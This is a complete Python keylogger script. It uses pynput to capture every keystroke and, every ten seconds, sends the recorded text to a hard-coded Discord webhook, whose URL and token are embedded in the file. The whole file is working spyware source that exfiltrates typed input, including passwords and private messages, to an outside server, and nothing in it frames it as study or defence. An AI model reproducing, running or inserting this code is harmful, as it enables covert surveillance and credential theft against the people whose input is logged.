from pynput import keyboard
import requests
import time

# Discord Webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1267879781404250123/X83marVWwVCWcCfycTSqdGdvFCgSVwNF1BXzS5A_HI-OlIf_A1DX-6I6xz9sJxP2SIvS'
keystrokes = ""
last_send_time = time.time()

# Function to send data to Discord
def send_to_discord(message):
    data = {
        "content": message,
        "username": "Keylogger"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        response.raise_for_status()
        print(f"Payload delivered successfully, code {response.status_code}.")
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except Exception as err:
        print(f"An error occurred: {err}")

# Function to handle key presses
def on_press(key):
    global keystrokes, last_send_time
    try:
        if key.char:  # Normal keys
            keystrokes += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            keystrokes += " "
        else:
            keystrokes += f"[{key.name}]"

    # Send keystrokes to Discord every 10 seconds
    if time.time() - last_send_time >= 10:
        if keystrokes:
            send_to_discord(keystrokes)
            keystrokes = ""
        last_send_time = time.time()

# Function to handle key release (stop on ESC)
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()